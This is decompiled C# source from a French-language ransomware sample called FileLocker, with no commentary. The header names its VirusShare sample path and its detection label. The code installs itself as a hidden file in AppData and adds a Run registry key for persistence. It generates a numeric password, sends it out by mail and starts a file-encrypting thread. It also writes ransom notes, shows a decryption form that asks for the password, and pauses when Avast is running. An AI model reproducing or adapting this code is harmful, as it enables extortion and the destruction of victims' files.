// Decompiled with JetBrains decompiler
// Type: FileLocker.Form1
// Assembly: FileLocker, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4E5EE51A-6914-4180-A10A-8B6B85AFF127
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Trojan-Ransom.Win32.Blocker.ibjo-459a487b0ad80fc56c06fca73eb80b3268bd423eaf6da5a1b400a7b5c19fb957.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace FileLocker
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private static List<WeakReference> __ENCList;
    private IContainer components;
    [AccessedThroughProperty("TextBox1")]
    private TextBox _TextBox1;
    [AccessedThroughProperty("Label1")]
    private Label _Label1;
    [AccessedThroughProperty("c")]
    private Label _c;
    [AccessedThroughProperty("Button3")]
    private Button _Button3;
    [AccessedThroughProperty("AvTheme1")]
    private AVTheme _AvTheme1;
    [AccessedThroughProperty("AvWindowButton1")]
    private AVWindowButton _AvWindowButton1;
    [AccessedThroughProperty("AvButton1")]
    private AVButton _AvButton1;
    [AccessedThroughProperty("AvTextbox1")]
    private AVTextbox _AvTextbox1;
    [AccessedThroughProperty("Description")]
    private System.Windows.Forms.Timer _Description;
    [AccessedThroughProperty("LinkLabel1")]
    private LinkLabel _LinkLabel1;
    [AccessedThroughProperty("PictureBox1")]
    private PictureBox _PictureBox1;
    [AccessedThroughProperty("AvLabel1")]
    private AVLabel _AvLabel1;
    [AccessedThroughProperty("AvLabel2")]
    private AVLabel _AvLabel2;
    [AccessedThroughProperty("TextOpen")]
    private System.Windows.Forms.Timer _TextOpen;
    public SearchEncodedFiles Decode;
    public SearchFile Encode;
    public string useri;
    public string mainpassword;
    public string ApplicationFolder;
    public string FichierStartup;
    public string FichierDesktop;

    [DebuggerNonUserCode]
    static Form1()
    {
      Class0.SLV0fFIsptsZtjvFft17();
      Form1.__ENCList = new List<WeakReference>();
    }

    public Form1()
    {
      Class0.SLV0fFIsptsZtjvFft17();
      // ISSUE: explicit constructor call
      base.\u002Ector();
      this.Load += new EventHandler(this.Form1_Load);
      Form1.__ENCAddToList((object) this);
      this.ApplicationFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Locker.exe";
      this.FichierStartup = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\Readme.txt";
      this.FichierDesktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Comment débloquer mes fichiers .txt";
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object object_0)
    {
      lock (Form1.__ENCList)
      {
        if (Form1.__ENCList.Count == Form1.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (Form1.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (Form1.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                Form1.__ENCList[index1] = Form1.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          Form1.__ENCList.RemoveRange(index1, checked (Form1.__ENCList.Count - index1));
          Form1.__ENCList.Capacity = Form1.__ENCList.Count;
        }
        Form1.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if ((!disposing || this.components == null ? 0 : 1) == 0)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.TextBox1 = new TextBox();
      this.Label1 = new Label();
      this.c = new Label();
      this.Button3 = new Button();
      this.Description = new System.Windows.Forms.Timer(this.components);
      this.TextOpen = new System.Windows.Forms.Timer(this.components);
      this.AvTheme1 = new AVTheme();
      this.AvLabel2 = new AVLabel();
      this.AvLabel1 = new AVLabel();
      this.PictureBox1 = new PictureBox();
      this.LinkLabel1 = new LinkLabel();
      this.AvWindowButton1 = new AVWindowButton();
      this.AvButton1 = new AVButton();
      this.AvTextbox1 = new AVTextbox();
      this.AvTheme1.SuspendLayout();
      ((ISupportInitialize) this.PictureBox1).BeginInit();
      this.SuspendLayout();
      TextBox textBox1_1 = this.TextBox1;
      Point point1 = new Point(183, 308);
      Point point2 = point1;
      textBox1_1.Location = point2;
      this.TextBox1.Multiline = true;
      this.TextBox1.Name = "TextBox1";
      TextBox textBox1_2 = this.TextBox1;
      Size size1 = new Size(241, 23);
      Size size2 = size1;
      textBox1_2.Size = size2;
      this.TextBox1.TabIndex = 3;
      this.Label1.AutoSize = true;
      Label label1_1 = this.Label1;
      point1 = new Point(103, 311);
      Point point3 = point1;
      label1_1.Location = point3;
      this.Label1.Name = "Label1";
      Label label1_2 = this.Label1;
      size1 = new Size(74, 13);
      Size size3 = size1;
      label1_2.Size = size3;
      this.Label1.TabIndex = 4;
      this.Label1.Text = "Mot de passe:";
      this.c.AutoSize = true;
      Label c1 = this.c;
      point1 = new Point(883, 349);
      Point point4 = point1;
      c1.Location = point4;
      this.c.Name = "c";
      Label c2 = this.c;
      size1 = new Size(12, 13);
      Size size4 = size1;
      c2.Size = size4;
      this.c.TabIndex = 5;
      this.c.Text = "\"";
      this.c.Visible = false;
      Button button3_1 = this.Button3;
      point1 = new Point(450, 301);
      Point point5 = point1;
      button3_1.Location = point5;
      this.Button3.Name = "Button3";
      Button button3_2 = this.Button3;
      size1 = new Size(151, 32);
      Size size5 = size1;
      button3_2.Size = size5;
      this.Button3.TabIndex = 6;
      this.Button3.Text = "Decrypter mes fichiers";
      this.Button3.UseVisualStyleBackColor = true;
      this.Description.Interval = 3000;
      this.TextOpen.Interval = 600000;
      this.AvTheme1.BackColor = Color.FromArgb(242, 242, 242);
      this.AvTheme1.Controls.Add((Control) this.AvLabel2);
      this.AvTheme1.Controls.Add((Control) this.AvLabel1);
      this.AvTheme1.Controls.Add((Control) this.PictureBox1);
      this.AvTheme1.Controls.Add((Control) this.LinkLabel1);
      this.AvTheme1.Controls.Add((Control) this.AvWindowButton1);
      this.AvTheme1.Controls.Add((Control) this.AvButton1);
      this.AvTheme1.Controls.Add((Control) this.AvTextbox1);
      this.AvTheme1.Dock = DockStyle.Fill;
      AVTheme avTheme1_1 = this.AvTheme1;
      point1 = new Point(0, 0);
      Point point6 = point1;
      avTheme1_1.Location = point6;
      this.AvTheme1.Name = "AvTheme1";
      this.AvTheme1.PageImage = (Image) null;
      this.AvTheme1.PageName = "Job Crypter";
      AVTheme avTheme1_2 = this.AvTheme1;
      size1 = new Size(670, 264);
      Size size6 = size1;
      avTheme1_2.Size = size6;
      this.AvTheme1.TabIndex = 7;
      this.AvTheme1.Text = "AvTheme1";
      this.AvLabel2.Image = (Image) null;
      AVLabel avLabel2_1 = this.AvLabel2;
      point1 = new Point(-28, 183);
      Point point7 = point1;
      avLabel2_1.Location = point7;
      this.AvLabel2.Name = "AvLabel2";
      AVLabel avLabel2_2 = this.AvLabel2;
      size1 = new Size(259, 25);
      Size size7 = size1;
      avLabel2_2.Size = size7;
      this.AvLabel2.String1 = "Votre ID:";
      this.AvLabel2.String2 = "";
      this.AvLabel2.TabIndex = 6;
      this.AvLabel2.Text = "ID:";
      this.AvLabel1.Image = (Image) null;
      AVLabel avLabel1_1 = this.AvLabel1;
      point1 = new Point(2, 227);
      Point point8 = point1;
      avLabel1_1.Location = point8;
      this.AvLabel1.Name = "AvLabel1";
      AVLabel avLabel1_2 = this.AvLabel1;
      size1 = new Size(603, 25);
      Size size8 = size1;
      avLabel1_2.Size = size8;
      this.AvLabel1.String1 = "Statut:";
      this.AvLabel1.String2 = "/ Tous les fichiers en été Crypté";
      this.AvLabel1.TabIndex = 5;
      this.AvLabel1.Text = "AvLabel1";
      this.PictureBox1.Image = (Image) FileLocker.My.Resources.Resources.loading;
      PictureBox pictureBox1_1 = this.PictureBox1;
      point1 = new Point(617, 216);
      Point point9 = point1;
      pictureBox1_1.Location = point9;
      this.PictureBox1.Name = "PictureBox1";
      PictureBox pictureBox1_2 = this.PictureBox1;
      size1 = new Size(47, 47);
      Size size9 = size1;
      pictureBox1_2.Size = size9;
      this.PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
      this.PictureBox1.TabIndex = 4;
      this.PictureBox1.TabStop = false;
      this.PictureBox1.Visible = false;
      this.LinkLabel1.AutoSize = true;
      LinkLabel linkLabel1_1 = this.LinkLabel1;
      point1 = new Point(3, 167);
      Point point10 = point1;
      linkLabel1_1.Location = point10;
      this.LinkLabel1.Name = "LinkLabel1";
      LinkLabel linkLabel1_2 = this.LinkLabel1;
      size1 = new Size(228, 13);
      Size size10 = size1;
      linkLabel1_2.Size = size10;
      this.LinkLabel1.TabIndex = 3;
      ((Label) this.LinkLabel1).TabStop = true;
      this.LinkLabel1.Text = "Vous n'avez pas de mot de passe ?, cliquer ICI";
      this.AvWindowButton1.BackColor = Color.Transparent;
      AVWindowButton avWindowButton1_1 = this.AvWindowButton1;
      point1 = new Point(648, 0);
      Point point11 = point1;
      avWindowButton1_1.Location = point11;
      this.AvWindowButton1.Name = "AvWindowButton1";
      this.AvWindowButton1.SetImage = "Close";
      AVWindowButton avWindowButton1_2 = this.AvWindowButton1;
      size1 = new Size(22, 22);
      Size size11 = size1;
      avWindowButton1_2.Size = size11;
      this.AvWindowButton1.TabIndex = 2;
      this.AvWindowButton1.Text = "AvWindowButton1";
      this.AvButton1.BackColor = Color.Transparent;
      AVButton avButton1_1 = this.AvButton1;
      point1 = new Point(451, 131);
      Point point12 = point1;
      avButton1_1.Location = point12;
      this.AvButton1.MainColor = (string) null;
      this.AvButton1.Name = "AvButton1";
      AVButton avButton1_2 = this.AvButton1;
      size1 = new Size(214, 33);
      Size size12 = size1;
      avButton1_2.Size = size12;
      this.AvButton1.TabIndex = 1;
      this.AvButton1.Text = "Débloquer mes fichiers ";
      this.AvTextbox1.BackColor = Color.White;
      this.AvTextbox1.Font = new Font("Verdana", 10f);
      this.AvTextbox1.ForeColor = Color.Gray;
      AVTextbox avTextbox1_1 = this.AvTextbox1;
      point1 = new Point(6, 131);
      Point point13 = point1;
      avTextbox1_1.Location = point13;
      this.AvTextbox1.MaxLength = (int) short.MaxValue;
      this.AvTextbox1.MultiLine = false;
      this.AvTextbox1.Name = "AvTextbox1";
      AVTextbox avTextbox1_2 = this.AvTextbox1;
      size1 = new Size(439, 33);
      Size size13 = size1;
      avTextbox1_2.Size = size13;
      this.AvTextbox1.TabIndex = 0;
      this.AvTextbox1.Text = "Mot de passe";
      this.AvTextbox1.TextAlignment = HorizontalAlignment.Left;
      this.AvTextbox1.UseSystemPasswordChar = false;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(670, 264);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.AvTheme1);
      this.Controls.Add((Control) this.Button3);
      this.Controls.Add((Control) this.Label1);
      this.Controls.Add((Control) this.TextBox1);
      this.Controls.Add((Control) this.c);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (Form1);
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "Tous vos fichiers sont Crypté";
      this.AvTheme1.ResumeLayout(false);
      this.AvTheme1.PerformLayout();
      ((ISupportInitialize) this.PictureBox1).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual TextBox TextBox1
    {
      [DebuggerNonUserCode] get => this._TextBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox1 = value;
    }

    internal virtual Label Label1
    {
      [DebuggerNonUserCode] get => this._Label1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label1 = value;
    }

    internal virtual Label c
    {
      [DebuggerNonUserCode] get => this._c;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._c = value;
    }

    internal virtual Button Button3
    {
      [DebuggerNonUserCode] get => this._Button3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Button3 = value;
    }

    internal virtual AVTheme AvTheme1
    {
      [DebuggerNonUserCode] get => this._AvTheme1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.AvTheme1_Click_1);
        if (this._AvTheme1 != null)
          this._AvTheme1.Click -= eventHandler;
        this._AvTheme1 = value;
        if (this._AvTheme1 == null)
          return;
        this._AvTheme1.Click += eventHandler;
      }
    }

    internal virtual AVWindowButton AvWindowButton1
    {
      [DebuggerNonUserCode] get => this._AvWindowButton1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.AvWindowButton1_Click);
        if (this._AvWindowButton1 != null)
          this._AvWindowButton1.Click -= eventHandler;
        this._AvWindowButton1 = value;
        if (this._AvWindowButton1 == null)
          return;
        this._AvWindowButton1.Click += eventHandler;
      }
    }

    internal virtual AVButton AvButton1
    {
      [DebuggerNonUserCode] get => this._AvButton1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.AvButton1_Click);
        if (this._AvButton1 != null)
          this._AvButton1.Click -= eventHandler;
        this._AvButton1 = value;
        if (this._AvButton1 == null)
          return;
        this._AvButton1.Click += eventHandler;
      }
    }

    internal virtual AVTextbox AvTextbox1
    {
      [DebuggerNonUserCode] get => this._AvTextbox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.AvTextbox1_Click_1);
        if (this._AvTextbox1 != null)
          this._AvTextbox1.Click -= eventHandler;
        this._AvTextbox1 = value;
        if (this._AvTextbox1 == null)
          return;
        this._AvTextbox1.Click += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Description
    {
      [DebuggerNonUserCode] get => this._Description;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Description_Tick);
        if (this._Description != null)
          this._Description.Tick -= eventHandler;
        this._Description = value;
        if (this._Description == null)
          return;
        this._Description.Tick += eventHandler;
      }
    }

    internal virtual LinkLabel LinkLabel1
    {
      [DebuggerNonUserCode] get => this._LinkLabel1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        LinkLabelLinkClickedEventHandler clickedEventHandler = new LinkLabelLinkClickedEventHandler(this.LinkLabel1_LinkClicked);
        if (this._LinkLabel1 != null)
          this._LinkLabel1.LinkClicked -= clickedEventHandler;
        this._LinkLabel1 = value;
        if (this._LinkLabel1 == null)
          return;
        this._LinkLabel1.LinkClicked += clickedEventHandler;
      }
    }

    internal virtual PictureBox PictureBox1
    {
      [DebuggerNonUserCode] get => this._PictureBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._PictureBox1 = value;
    }

    internal virtual AVLabel AvLabel1
    {
      [DebuggerNonUserCode] get => this._AvLabel1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._AvLabel1 = value;
    }

    internal virtual AVLabel AvLabel2
    {
      [DebuggerNonUserCode] get => this._AvLabel2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._AvLabel2 = value;
    }

    internal virtual System.Windows.Forms.Timer TextOpen
    {
      [DebuggerNonUserCode] get => this._TextOpen;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TextOpen_Tick);
        if (this._TextOpen != null)
          this._TextOpen.Tick -= eventHandler;
        this._TextOpen = value;
        if (this._TextOpen == null)
          return;
        this._TextOpen.Tick += eventHandler;
      }
    }

    public static string CreateRandomPassword(int int_0)
    {
      string str = "0123456789";
      Random random = new Random();
      char[] chArray = new char[checked (int_0 - 1 + 1)];
      int length = str.Length;
      int num = checked (int_0 - 1);
      int index = 0;
      while (index <= num)
      {
        chArray[index] = str[checked ((int) Math.Round(Conversion.Fix(unchecked ((double) str.Length * random.NextDouble()))))];
        checked { ++index; }
      }
      return new string(chArray);
    }

    [MethodImpl(MethodImplOptions.NoOptimization)]
    public void Installation()
    {
      if (File.Exists(Conversions.ToString((object) this.ApplicationFolder)))
        File.Delete(Conversions.ToString((object) this.ApplicationFolder));
      File.Copy(Application.ExecutablePath, Conversions.ToString((object) this.ApplicationFolder));
      File.SetAttributes(Conversions.ToString((object) this.ApplicationFolder), FileAttributes.Hidden);
      AddExtenssionModule.KU_KeyCreate("Software\\Microsoft\\Windows\\CurrentVersion\\Run", "application", Conversions.ToString((object) this.ApplicationFolder));
      System.Type Type = typeof (Process);
      object[] objArray = new object[1]
      {
        RuntimeHelpers.GetObjectValue((object) this.ApplicationFolder)
      };
      object[] Arguments = objArray;
      bool[] flagArray = new bool[1]{ true };
      bool[] CopyBack = flagArray;
      NewLateBinding.LateCall((object) null, Type, "Start", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
      if (flagArray[0])
        this.ApplicationFolder = (string) RuntimeHelpers.GetObjectValue(objArray[0]);
      ProjectData.EndApp();
    }

    public void Startapplication()
    {
      if (!KeyRegistration.smethod_0())
      {
        this.mainpassword = Form1.CreateRandomPassword(20);
        AddExtenssionModule.AddExtenssion();
        if (Operators.ConditionalCompareObjectEqual(Mail.send(this.mainpassword), (object) true, false))
        {
          AddExtenssionModule.KU_KeyCreate("Software\\", "Code", this.mainpassword);
          EncodeFiles.Password = this.mainpassword;
          this.Encode = new SearchFile();
          new Thread(new ThreadStart(this.Encode.method_0), 1).Start();
          AddExtenssionModule.KU_KeyCreate("Software\\", "1", "1");
          return;
        }
      }
      if (KeyRegistration.ExistsKey())
      {
        this.mainpassword = KeyRegistration.RegRead();
        EncodeFiles.Password = this.mainpassword;
        this.Encode = new SearchFile();
        new Thread(new ThreadStart(this.Encode.method_0), 1).Start();
      }
      else
      {
        this.Visible = true;
        this.ShowInTaskbar = true;
        this.Description.Enabled = true;
        this.TextOpen.Enabled = true;
      }
    }

    public bool PasswordTest(string string_0)
    {
      bool flag;
      try
      {
        TripleDESCryptoServiceProvider cryptoServiceProvider1 = new TripleDESCryptoServiceProvider();
        MD5CryptoServiceProvider cryptoServiceProvider2 = new MD5CryptoServiceProvider();
        cryptoServiceProvider1.Key = cryptoServiceProvider2.ComputeHash(Encoding.ASCII.GetBytes(string_0));
        cryptoServiceProvider1.Mode = CipherMode.ECB;
        ICryptoTransform decryptor = cryptoServiceProvider1.CreateDecryptor();
        byte[] inputBuffer = Convert.FromBase64String(File.ReadAllText(Application.ExecutablePath + ".locked"));
        Encoding.ASCII.GetString(decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public static string GenerateRandomPassword(int int_0)
    {
      string str = "0123456789";
      Random random = new Random();
      char[] chArray = new char[checked (int_0 - 1 + 1)];
      int length = str.Length;
      int num = checked (int_0 - 1);
      int index = 0;
      while (index <= num)
      {
        chArray[index] = str[checked ((int) Math.Round(Conversion.Fix(unchecked ((double) str.Length * random.NextDouble()))))];
        checked { ++index; }
      }
      return new string(chArray);
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.Visible = false;
      this.ShowInTaskbar = false;
      if (Process.GetProcessesByName("AvastSvc").Length >= 1)
        Thread.Sleep(3000);
      this.AvLabel2.String1 = "Votre Identifiant: " + this.method_0();
      if (Operators.ConditionalCompareObjectEqual((object) Application.ExecutablePath, (object) this.ApplicationFolder, false))
        this.Startapplication();
      else
        this.Installation();
    }

    private void Button1_Click(object sender, EventArgs e)
    {
    }

    public string EncryptionNotComplet() => "";

    public string method_0() => new ManagementObject("Win32_LogicalDisk.DeviceID=\"C:\"").Properties["VolumeSerialNumber"].Value.ToString();

    private void AvWindowButton1_Click(object sender, EventArgs e) => this.Close();

    private void Description_Tick(object sender, EventArgs e)
    {
      if (!File.Exists(this.FichierDesktop))
      {
        StreamWriter streamWriter = new StreamWriter(this.FichierDesktop);
        streamWriter.Write(FileLocker.My.Resources.Resources.TextFile1 + this.method_0() + "\r\n" + FileLocker.My.Resources.Resources.TextFile2);
        streamWriter.Close();
      }
      if (File.Exists(this.FichierStartup))
        return;
      StreamWriter streamWriter1 = new StreamWriter(this.FichierStartup);
      streamWriter1.Write(FileLocker.My.Resources.Resources.TextFile1 + this.method_0() + "\r\n" + FileLocker.My.Resources.Resources.TextFile2);
      streamWriter1.Close();
    }

    private void AvButton1_Click(object sender, EventArgs e)
    {
      if (this.PasswordTest(this.AvTextbox1.Text))
      {
        this.AvButton1.Enabled = false;
        this.AvTextbox1.Enabled = false;
        this.PictureBox1.Visible = true;
        this.AvLabel1.String2 = "/ Décryptage de vos fichier en cours, Veuillez ne pas interrompre le Processus";
        DecodeFiles.Password = this.AvTextbox1.Text;
        this.Decode = new SearchEncodedFiles();
        new Thread(new ThreadStart(this.Decode.method_0), 1).Start();
      }
      else
      {
        int num = (int) Interaction.MsgBox((object) "Mot de passe invalide", MsgBoxStyle.Information);
      }
    }

    private void AvTheme1_Click_1(object sender, EventArgs e)
    {
    }

    private void AvTheme1_Click(object sender, EventArgs e)
    {
    }

    private void AvTextbox1_Click(object sender, EventArgs e)
    {
    }

    private void LinkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
    {
      if (!File.Exists(this.FichierDesktop))
        return;
      Process.Start(this.FichierDesktop);
    }

    private void AvTextbox1_Click_1(object sender, EventArgs e) => this.AvTextbox1.Text = "";

    private void TextOpen_Tick(object sender, EventArgs e)
    {
      try
      {
        Process.Start(this.FichierStartup);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
